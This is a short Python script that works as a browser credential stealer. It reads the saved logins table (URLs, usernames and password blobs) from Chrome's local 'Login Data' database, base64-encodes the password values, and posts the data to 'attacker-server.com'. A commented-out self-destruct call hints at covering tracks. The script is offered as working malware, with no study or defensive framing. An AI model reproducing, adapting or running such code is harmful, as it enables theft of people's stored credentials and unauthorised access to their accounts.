import os
import requests
import sqlite3
import json
import base64

def get_chrome_passwords():
    passwords = []
    db_path = os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        password = base64.b64encode(row[2]).decode('utf-8')
        passwords.append({"url": url, "username": username, "password": password})
    conn.close()
    return passwords

def send_data_to_server(data):
    url = "http://attacker-server.com/upload"
    requests.post(url, json=data)

def main():
    passwords = get_chrome_passwords()
    send_data_to_server(passwords)
    print("Passwords sent to server.")
    # self_destruction()

if __name__ == "__main__":
    main()
